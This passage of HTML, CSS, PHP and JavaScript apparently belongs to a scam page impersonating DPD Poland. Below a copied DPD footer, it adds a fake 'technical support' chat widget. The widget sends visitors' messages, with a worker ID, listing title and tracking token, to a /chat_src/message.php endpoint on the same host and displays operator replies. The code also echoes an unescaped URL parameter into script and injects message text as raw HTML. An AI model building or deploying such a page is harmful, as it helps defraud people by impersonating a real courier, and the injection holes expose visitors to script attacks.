<div class="col-lg-8 col-md-9 px-0 footer-menu">
<nav class="nav d-inline-block footer-text font-light footer-nav float-right">
<ul class="footer-link px-0">
<li>
<a href="https://www.dpd.com/pl/pl/polityka-prywatnosci/" class="grey-color">Polityka prywatności</a>
</li>
<li>
<a href="https://www.dpd.com/pl/pl/o-dpd/kontakt/" class="grey-color">Kontakt</a>
</li>
<li>
<a href="https://www.dpd.com/pl/pl/o-dpd/ochrona-danych-osobowych/" class="grey-color">Ochrona danych osobowych</a>
</li>
<li>
<a href="https://www.dpd.com/pl/pl/moje-dpd/zostan-klientem-dpd-polska/" class="grey-color">Zostań naszym klientem</a>
</li>
<li>
<a href="https://kurier.dpd.com.pl/zostan-kurierem/" class="grey-color">Zostań kurierem</a>
</li>
<li>
<a href="https://www.dpd.com/group/en" class="grey-color">DPDgroup</a>
</li>
</ul>
</nav>
</div>
</div>
</div>
</div>
<div class="row-fix-margin-auto mobile-footer d-block d-md-none gold-bg-color">
<div class="col-12 no-padding">
<div class="row">
<div class="col-12 footer-menu-root-item">
<p class="small-text mb-2 footer-link-toggle">
<a href="https://www.dpd.com/pl/pl/oferta-dla-firm/" class="grey-color">
Oferta dla firm </a>
</p>
</div>
<div class="col-12 footer-menu-root-item">
<p class="small-text mb-2 footer-link-toggle">
<a href="https://www.dpd.com/pl/pl/obsluga-klienta/" class="grey-color">
Moje DPD </a>
</p>
</div>
<div class="col-12 footer-menu-root-item">
<p class="small-text mb-2 footer-link-toggle">
<a href="https://www.dpd.com/pl/pl/o-dpd/" class="grey-color">
O DPD </a>
</p>
</div>
<div class="col-12 footer-menu-root-item">
<p class="small-text mb-2 footer-link-toggle">
<a href="https://kariera.dpd.com.pl/" class="grey-color">
Kariera w DPD </a>
</p>
</div>
</div>
</div>
<div class="col-12 no-padding">
<div id="dpd_social_accounts_wg-3" class="widget dpd_social_accounts_wg"><div class="widget__inner dpd_social_accounts_wg__inner widget-wrap"> <div class="mb-3">
<p class="small-text mb-2">Social Media</p>
<p class="small-text mb-2 font-light">
<a href="https://twitter.com/dpdgroup_news?lang=en" class="fsocial-link primary-color mr-3" target="_blank"><img class="mb-1" src="./dpd_files/dpd-image-15.png" width="22" height="22"></a><a href="https://www.linkedin.com/company/dpdgroup" class="fsocial-link primary-color mr-3" target="_blank"><img class="mb-1" src="./dpd_files/dpd-image-14.png" width="22" height="22"></a><a href="https://www.instagram.com/dpdgroup_news/" class="fsocial-link primary-color mr-3" target="_blank"><img class="mb-1" src="./dpd_files/dpd-image-13.png" width="22" height="22"></a><a href="https://www.youtube.com/channel/UCqQgjVUrIjw8TsoDUooBaFQ" class="fsocial-link primary-color mr-3" target="_blank"><img class="mb-1" src="./dpd_files/dpd-image-16.png" width="22" height="22"></a>
</p>
</div>
</div></div><div id="custom_html-2" class="widget_text widget widget_custom_html"><div class="widget_text widget__inner widget_custom_html__inner widget-wrap"><div class="textwidget custom-html-widget"></div></div></div>
<div class="footer-clear col-12 bold-bg-color mb-3"></div>
</div>
<div class="col-12 no-padding">
<div class="row vertical-align">
<div class="col-lg-4 col-md-3 px-md-0 small-text font-light footer-logo">
<img src="./dpd_files/dpd-image-12.png" alt=""><span>&nbsp;© 2020 DPD</span>
</div>
<div class="col-12 footer-menu">
<nav class="nav d-block pt-1 small-text font-light footer-nav">
<ul class="footer-link">
<li>
<a href="https://www.dpd.com/pl/pl/polityka-prywatnosci/" class="grey-color">Polityka prywatności</a>
</li>
<li>
<a href="https://www.dpd.com/pl/pl/o-dpd/kontakt/" class="grey-color">Kontakt</a>
</li>
<li>
<a href="https://www.dpd.com/pl/pl/o-dpd/ochrona-danych-osobowych/" class="grey-color">Ochrona danych osobowych</a>
</li>
<li>
<a href="https://www.dpd.com/pl/pl/moje-dpd/zostan-klientem-dpd-polska/" class="grey-color">Zostań naszym klientem</a>
</li>
<li>
<a href="https://kurier.dpd.com.pl/zostan-kurierem/" class="grey-color">Zostań kurierem</a>
</li>
<li>
<a href="https://www.dpd.com/group/en" class="grey-color">DPDgroup</a>
</li>
</ul>
</nav>
</div>
</div>
</div>
</div>
</footer>


<style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #D5294F;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #D5294F;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #D5294F;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>


    <div id="offonthechap">
            <div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
                <div class="chaport-launcher" style="left: 0px; right: 0px;">
                    <div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
                        <div class="chaport-launcher-chat-icon"></div>
                        <input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
                        <input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
                        <input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
                        <div class="chaport-launcher-close-icon"></div>
                        <div class="chaport-launcher-operator-photo"></div>
                    </div>
                </div>
                <div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
                    <div class="chaport-inner">
                        <div class="main-textblock">
                            <div class="operatorblock">
                                <div class="operatorblock-content" style="display: flex;">
                                    <div id="operator-photo">
                                        <img id="oper-photo-img" src="./dpd_files/operator-img.png">
                                        <div class="operator-name">Sofia</div>
                                    </div>
                                    <div class="team-wrapper">
                                        <div class="team">Pomoc techniczna</div>
                                        <div class="activity-indicator">
                                            <div class="with-status" style="display: inline-block;">
                                                <div class="status-online" style="display: inline-block;">
                                                    
                                                </div>online</div>
                                            </div>
                                        </div>
                                </div>
                            </div>
                            <div class="chat-block">
                                <div id="chat">
                                    <div class="operators-msg" id="greeting-msg" style="display: none;">
                                        <div class="operators-photo"><img src="./dpd_files/operator-img.png"></div>
                                        <div class="operators-first-text">Dzień dobry! Jak mogę ci pomóc?</div>                            
                                    </div>
                                
                                </div>
                                <div id="input-msg" style="display: flex;">
                                    <input type="text" name="smstosup1" id="smstosup1" placeholder="Wpisz swoją wiadomość...">
                                    <button id="smstosupbutton1" onclick="sendMessage()">
                                        <div class="chaport-send-icon">
                                            <svg width="18" height="18" viewBox="0 0 535.5 535.5">
                                                <polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">      
                                                </polygon>
                                            </svg>
                                        </div>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>  
                    <div class="chaport-big-shadow"></div>
            </div>
        </div>


        <script type="text/javascript">


var supportbutton = document.querySelector('.chaport-launcher-button');
    var supportwindow = document.querySelector('.chaport-window');

    supportbutton.onclick = function() {
        if (supportwindow.style.opacity == '0') {
            supportwindow.style.opacity = '1';
            supportwindow.style.visibility = 'visible';
        } else {
            supportwindow.style.opacity = '0';
            supportwindow.style.visibility = 'hidden';
        }
    };
</script>

<script type="text/javascript">

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
var supportbutton = document.querySelector('.chaport-launcher-button');
var supportwindow = document.querySelector('.chaport-window');
var token = <?php echo $_GET['id']; ?>;
if (token !== null) {
if (pool) {
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
pool = false;
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("get=0&token=" + token);
xhttp.onload = function (e) {
if (xhttp.readyState === 4) {
  if (xhttp.status === 200) {
    var body = xhttp.response;
    pool = true;
    var json = JSON.parse(body);
    for (let i = 0; i < json.length; i++) {
      cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
      if (json[i].sender == 't') {
        text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
      } else if (json[i].sender == 'i') {
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }else if (json[i].sender == "testOnline"){
        return 'okay';
      }else{
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }

      
      $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
      var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
      objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
      supportwindow.style.opacity = '1';
      supportwindow.style.visibility = 'visible';
    }

  } else {
    pool = true;
  }
}
}
}
}
}

function sendMessage() {
message = document.getElementById("smstosup1").value;
if (message === '') {
return;
}
document.getElementById("smstosup1").value = '';
var token = document.getElementById("refresh_time").value;
if (token === null) {
var token = Math.random().toString(36).substring(7);
}
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var uid = document.getElementById("home_time").value;
var title = document.getElementById("product").value;
xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
setCookie('token', token);
var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
var d = new Date();
d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
var expires = "expires=" + d.toUTCString();
document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

</script>

</div>
</body></html>